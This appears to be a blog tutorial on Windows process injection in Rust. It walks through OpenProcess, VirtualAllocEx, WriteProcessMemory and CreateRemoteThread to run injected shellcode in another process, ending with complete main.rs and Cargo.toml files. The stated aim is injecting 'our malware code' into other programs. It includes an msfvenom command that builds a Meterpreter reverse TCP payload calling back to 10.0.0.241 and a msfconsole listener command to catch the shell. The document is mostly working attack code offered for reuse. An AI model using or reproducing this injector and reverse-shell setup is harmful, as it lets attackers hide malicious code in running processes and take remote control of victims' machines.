### Use Case

- Inject our malware code into other programs and migrate to different processes.
### Theory

#### Process

- A process is a container that is created to house a running application.
- Each Windows process maintains its own virtual memory space.
- We can use Win32 APIs to communicate to other processes.
#### Threads

- A thread executes the compiled assembly code of the application.
- A process may have multiple threads to perform simultaneous actions and each thread will have its own stack and shares the virtual memory space of the process.

### Flow Chart for Process Injection

OpenProcess ---> VirtualAllocEx --->WriteProcessMemory -->  CreateRemoteThread

 
| OpenProcess                      | VirtualAllocEX                      | WriteProcessMemory                        | CreateRemoteThread                 |
| -------------------------------- | ----------------------------------- | ----------------------------------------- | ---------------------------------- |
| Opens channel to another Process | Allocating memory in target Process | Writing our malicious code in the Process | create the remote execution thread |

### OpenProcess

#### Structure
```rust
pub unsafe fn OpenProcess<P0>(
    dwdesiredaccess: PROCESS_ACCESS_RIGHTS,
    binherithandle: P0,
    dwprocessid: u32
) -> Result<HANDLE>where
    P0: IntoParam<BOOL>,
```

- `dwdesiredaccess`: This is like telling Windows _exactly_ what we want to do with the process (read its memory, change things, etc.). In our case we will be using `PROCESS_ALL_ACCESS`.
- `binherithandle` : This is about whether new programs we make should also get a copy of the handle. We usually don't need this and will use `false` in our case as its is `BOOL`.
- `dwprocessid`: This is the ID number of the process we will be targeting.
- `where P0: IntoParam<BOOL>` : This bit is a little advanced, but basically, it lets Windows be flexible about what we put in for the `binherithandle`.
- `Result<HANDLE>` : This is the return handle for the process which helps us perform other actions on the process.

#### Implementing `OpenProcess` API

##### Creating a new Rust project

```bash
cargo new --bin projecss_injection
```
##### Adding windows crate in `Cargo.toml`

```toml
[dependencies.windows]
version = "0.53.0"
features = [
    "Win32_Foundation",
    "Win32_UI_WindowsAndMessaging",
    "Win32_System_Threading",
    // Update as needed
]
```
##### Importing necessary modules in our `main.rs`

```rust
use windows::Win32::Foundation::HANDLE;

use windows::Win32::System::Threading::{OpenProcess,PROCESS_ALL_ACCESS};

use windows::core::Error;
```
##### Creating `open_process` function
```rust

unsafe fn open_process(id:u32)->Result<HANDLE,Error>{

let desired_access = PROCESS_ALL_ACCESS;

let result = OpenProcess(desired_access, false, id)?;

Ok(result)

}
```
- The above functions takes`id` of type `u32`  which is the id of the target process and returns a `Result<Handle, Error>` enum, which indicates that if the function is successful it returns a Handle to that process otherwise throws an error.

- The `desired_access` variable stores the `dwdesiredaccess` value as mentioned earlier.

- Finally, we called the `OpenProcess` API and passing all the required values. The `?` operator tries to unwrap the value returned, which should be a Handle to the process. If it is successful it sends `Ok(result)` and if not the returns an error.

##### Creating `main()` function

```rust
fn main()-> Result<(),Box<Error>>{

let process_id:u32= 5812;

unsafe {

let process_handle = open_process(&process_id)?;

}

Ok(())

}
```

- In the main function, we start by defining the `process_id` variable having the `pid` of the target process.
- Then we open the channel to the target process by calling the `open_process` function which returns the handle to the process.
- The `Ok(())` part tells Rust that your program ran successfully and didn't encounter any errors.

For the sake of simplicity we are hard coding the value of target process id. You can find the `process_id` from the process explorer. In the upcoming blog will explain how to obtain the `pid` of a process dynamically.

Remember that the process id changes after the restart of an application. So you need to change the `pid` every time you reopen the application.


![[Pasted image 20240317134931.png]]


### VirtualAllocEx

We have now a channel open to our target process.Our next step is to allocate memory for our shell code in that processes virtual address space.
#### Structure

```rust
pub unsafe fn VirtualAllocEx<P0>(
    hprocess: P0,
    lpaddress: Option<*const c_void>,
    dwsize: usize,
    flallocationtype: VIRTUAL_ALLOCATION_TYPE,
    flprotect: PAGE_PROTECTION_FLAGS
) -> *mut c_void where
    P0: IntoParam<HANDLE>,
```

- **`hprocess`:** A handle to the process in which we want to allocate memory. We'll get this handle from the `OpenProcess` function we described earlier and it is of type `Handle`
- **`lpaddress`:** An optional pointer to a proposed starting address for the memory region we want to allocate. If this is `None`, the operating system will determine a suitable address for us.
- **`dwsize`:** The size of the region of memory to allocate, in bytes.
- **`flallocationtype`:** A flag from the `VIRTUAL_ALLOCATION_TYPE` enumeration controlling how to allocate the memory. Common options include:
    - `MEM_COMMIT`: Actually allocates physical storage (memory) for the region.
    - `MEM_RESERVE`: Reserves a block of the process's address space without allocating physical storage.
- **`flprotect`:** A flag from the `PAGE_PROTECTION_FLAGS` enumeration controlling the initial protection on the allocated memory pages. Examples:
    - `PAGE_READONLY`: Grants read-only access.
    - `PAGE_READWRITE`: Grants read and write access.
    - `PAGE_EXECUTE_READWRITE`: Grants execute and read access (often used for allocating code).

- **`*mut c_void`:** A pointer to the base address of the allocated memory region if successful. If the function fails, it will return `NULL`.

#### Implementing `VirtualAllocEx` API
##### Updating our `Cargo.toml`

```
"Win32_System_Memory",
```

This feature will give use access to `VirtualAllocEx`, `VIRTUAL_ALLOCATION_TYPE`, `PAGE_PROTECTION_FLAGS`.
##### Importing necessary modules

```rust
use windows::Win32::System::Memory::{VirtualAllocEx,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};

use std::os::raw::c_void;
```
##### Creating `allocate_memory` function

```rust
unsafe fn allocate_memory(handle:&HANDLE)-> *mut c_void {

let lpaddress:Option<*const c_void> = None;

let dwsize = 4096;

let flallocationtype = MEM_COMMIT | MEM_RESERVE;

let flprotect = PAGE_EXECUTE_READWRITE;

let address = VirtualAllocEx(*handle, lpaddress, dwsize, flallocationtype, flprotect);

address

}
```

The `allocate_memory` function  takes `handle` we created as input and encapsulates the steps to allocate a `4096`-byte block of memory within a process, with read, write, and execute permissions (`MEM_COMMIT | MEM_RESERVE` and  `PAGE_EXECUTE_READWRITE`).
The operating system determines the specific location of this allocated memory while the value of  `lpaddress` is None.

It returns `base address` of the allocated memory location.
##### Updating `main.rs`

```rust
let process_id:u32 = 3148
let address = allocate_memory(&handle);
```

Here we call our `allocate_memory` function and pass the handle we obtained earlier to obtain the base address.

Now, before we move forward we need to generate a reverse shell which we will be injecting in the target process.
### Shell code generation

- We generate shell code targeting x64 architecture for a Meterpreter reverse TCP payload on Windows.
- Note: The shell code output format is set to C#, which will be compatible with our Rust code.
- Bypassing AMSI and antivirus is not within the scope of this blog, but will be covered in a future posts.

#### Creating MSF venom payload
```
msfvenom --arch x64 --payload windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.241 LPORT=8081 EXITFUNC=thread --format csharp
```

![[Pasted image 20240316234138.png]]


### WriteProcessMemory

Next, we'll copy the shell code into the memory space of `explorer.exe`. We'll use `WriteProcessMemory` API for this,
#### Structure


```rust 
pub unsafe fn WriteProcessMemory<P0>(
    hprocess: P0,
    lpbaseaddress: *const c_void,
    lpbuffer: *const c_void,
    nsize: usize,
    lpnumberofbyteswritten: Option<*mut usize>
) -> Result<()>where
    P0: IntoParam<HANDLE>,
```

- **`hprocess`:** A handle to the process in which we want to allocate memory. We'll get this handle from the `OpenProcess` function we described earlier and it is of type `Handle`
- **Important:** Ensure the process handle has the necessary permissions (usually `PROCESS_ALL_ACCESS`) to modify the target process's memory.
- **`lpbaseaddress`:** A pointer to the starting address in the target process's address space where you want to begin writing data, this is  **pointer** to our `base address`.
- **`lpbuffer`:** A pointer to the buffer containing the data we want to write into the target process's memory.In the context of process injection, this will  point to our `shellcode` we generated earlier.
- **`nsize`:**  The number of bytes to write from the buffer into the target process.This should match the size of our shell code.
- **`lpnumberofbyteswritten`:** A pointer to a variable where the function can optionally store the actual number of bytes written.This might be useful for debugging, but we can often pass `None` if we don't need this information.

##### Updating our `Cargo.toml`
```
"Win32_System_Diagnostics_Debug",
```

This feature will give use access to `WriteProcessMemory` API.
##### Importing necessary modules

```rust
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
```
##### Creating `write_in_memory` function
```rust

unsafe fn write_in_memory(handle:&HANDLE,addr:*mut c_void,shellcode:*const c_void,nsize:&usize)-> Result<(), Error> {

let success = WriteProcessMemory(*handle, addr, shellcode, *nsize, None)?;

Ok(success)

}
```

 The function calls `WriteProcessMemory` to perform the actual memory write operation. It passes the handle, address, shellcode pointer, and size.
- `Result<(), Error>`: The function returns a `Result` type, indicating potential success (`Ok(())`) or an error (`Err(Error)`).
##### Updating `main.rs`

```rust
let shellcode:[u8;511] = [//Put your shell code generated here.]

let success = write_in_memory(&process_handle, base_address, shellcode.as_ptr() as *const c_void, &shellcode.len())?;

```
Here we called or write_in_memory function which will write out shell code in new created memory within the target process. 

### CreateRemoteThread

#### Structure

```rust
pub unsafe fn CreateRemoteThread<P0>(
    hprocess: P0,
    lpthreadattributes: Option<*const SECURITY_ATTRIBUTES>,
    dwstacksize: usize,
    lpstartaddress: LPTHREAD_START_ROUTINE,
    lpparameter: Option<*const c_void>,
    dwcreationflags: u32,
    lpthreadid: Option<*mut u32>
) -> Result<HANDLE>where
    P0: IntoParam<HANDLE>,
```
- **`hprocess`:** A handle to the target process where the new thread will run. You need the appropriate permissions on this handle.
- **`lpthreadattributes`:** Optional security settings for the thread (often passed as `None`).
- **`dwstacksize`:** Initial stack size for the new thread (or `0` for default).
- **`lpstartaddress`:** **Crucial!** This is the address _within the target process_ where our thread's code begins execution (the base address of injected shell code) the type of this parameter is `LPTHREAD_START_ROUTINE` so we need to perform proper type casting.
- **`lpparameter`:** Optional argument we can pass to our thread function.
- **`dwcreationflags`:** Controls how the thread starts (immediately or suspended, etc.).
- **`lpthreadid`:** Optionally receives the ID of the newly created thread.

 #### Handling Type Mismatch

The `CreateRemoteThread` function requires its `lpstartaddress` parameter to be of type `LPTHREAD_START_ROUTINE`. However, the memory address returned by `VirtualAllocEx` is of type `*mut c_void`, resulting in a type mismatch.
##### Type Casting with Transmute

To cast the raw memory address (`*mut c_void`) into a function pointer with the correct signature, we use the `transmute` function. Here's how it's done:

```rust
let startaddress = Some(transmute(base_address));
```
- **`LPTHREAD_START_ROUTINE` Signature:** It's an `Option` enum that can have `Some` with a function pointer value.

- **Casting Process:** By using `transmute`, we effectively cast the `base_address` to the required function pointer type. Rust infers the destination type automatically, making the code concise and readable.
#### Implementing `CreateRemoteTheard` API
##### Updating our `Cargo.toml`

We don't need to update our `Cargo.toml` file for this one. We just need to import few things from
`"Win32_System_Threading"` in our `main.rs`

##### Importing necessary modules in `main.rs`

```rust
use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, LPTHREAD_START_ROUTINE, PROCESS_ALL_ACCESS};
```
Here we updated our use of Threading module and imported`CreateRemoteThread`,  `LPTHREAD_START_ROUTINE`  modules
##### Creating `create_thread_execution` function
```rust
unsafe fn create_thread_execution(handle:&HANDLE,startaddress:LPTHREAD_START_ROUTINE)-> Result<HANDLE, Error>{

let thread_handle= CreateRemoteThread(*handle, None, 0,

startaddress, None, 0, None)?;

Ok(thread_handle)

}
```

This function creates a thread in a remote process using the provided handle and start address.
##### Updating `main.rs`
```
let thread_handle = create_thread_execution(&process_handle, startaddress)?;
```

 We call the `create_thread_execution` function to create a thread in the target process using the obtained process handle and start address.
### Shell Code Execution
#### Starting Msfconsole
```bash
sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.241; set LPORT 8081; exploit"
```

![[Pasted image 20240317135408.png]]

 Once our listener is up and running we can execute our binary file on the windows machine.

![[Pasted image 20240317135620.png]]

We can observe from the result below that we have successfully injected our shell into the remote process with PID 5812. However, in most scenarios, hard coding the PID value in the code is not practical. Instead, we can dynamically retrieve the PID of a process based on its name. This process is beyond the scope of this blog but will be covered in my next post, which will continue the discussion from this blog.

![[Pasted image 20240317135636.png]]

The complete code can be downloaded from my GitHub repository [here](https://github.com/hacksafely/process_injection). Feel free to explore the implementation in more detail and use it in your own projects.

Here are still both `main.rs` and `cargo.toml` for reference.
### `main.rs`

```rust
  

use std::mem::transmute;

use std::os::raw::c_void;

use windows::Win32::Foundation::HANDLE;

use windows::Win32::System::Threading::{CreateRemoteThread, OpenProcess, LPTHREAD_START_ROUTINE, PROCESS_ALL_ACCESS};

use windows::core::Error;

use windows::Win32::System::Memory::{VirtualAllocEx,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};

use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;

  

unsafe fn open_process(id:&u32)->Result<HANDLE,Error>{

let desired_access = PROCESS_ALL_ACCESS;

let result = OpenProcess(desired_access, false, *id)?;

Ok(result)

}

unsafe fn allocate_memory(handle:&HANDLE,dwsize:&usize)-> *mut c_void {

let lpaddress:Option<*const c_void> = None;

let flallocationtype = MEM_COMMIT | MEM_RESERVE;

let flprotect = PAGE_EXECUTE_READWRITE;

let address = VirtualAllocEx(*handle, lpaddress, *dwsize, flallocationtype, flprotect);

address

  

}

  

unsafe fn write_in_memory(handle:&HANDLE,addr:*mut c_void,shellcode:*const c_void,nsize:&usize)-> Result<(), Error> {

let success = WriteProcessMemory(*handle, addr, shellcode, *nsize, None)?;

Ok(success)

}

  

unsafe fn create_thread_execution(handle:&HANDLE,startaddress:LPTHREAD_START_ROUTINE)-> Result<HANDLE, Error>{

let thread_handle= CreateRemoteThread(*handle, None, 0,

startaddress, None, 0, None)?;

Ok(thread_handle)

  

}

  

fn main()-> Result<(),Error>{

let process_id:u32= 3148;

let shellcode:[u8;511] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8.......// You need to paste you shell here];


unsafe {

  

// Creating a process handle

let process_handle = open_process(&process_id)?;

// Allocating the memory in target process virtual address space

let base_address = allocate_memory(&process_handle,&shellcode.len());

// Writing the shell code in the memory

let success = write_in_memory(&process_handle, base_address, shellcode.as_ptr() as *const c_void, &shellcode.len())?;

// Type Coversion for creat_remote_thread startaddress.

let startaddress = Some(transmute(base_address));

// Creating the remote thread

let thread_handle = create_thread_execution(&process_handle, startaddress)?;

  

}

  

Ok(())

}
```


### `Cargo.toml`

```toml
[package]
name = "process_injection"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]

[dependencies.windows]
version = "0.53.0"
features = [
    "Win32_Foundation",
    "Win32_UI_WindowsAndMessaging",
    "Win32_System_Threading",
    "Win32_System_Memory",
    "Win32_System_Diagnostics_Debug",
    "Win32_Security",
]

```


### 1. **Cross-compilation to Windows**

If you're on a Linux machine and you're trying to use Windows APIs, you need to cross-compile your Rust code for a Windows target.

#### Step 1: Install the required toolchain for cross-compilation

To cross-compile to Windows from Linux, you need to install the `x86_64-pc-windows-gnu` target:

```
rustup target add x86_64-pc-windows-gnu

```

#### Step 2: Install the MinGW toolchain

Since you're cross-compiling to Windows, you need to install MinGW, which provides the necessary Windows headers and libraries. On Ubuntu, you can install it via:

```
sudo apt install mingw-w64

```

#### Step 3: Compile for the Windows target

Once the toolchain and MinGW are installed, you can compile your code for the Windows target:

```
cargo build --target x86_64-pc-windows-gnu

```
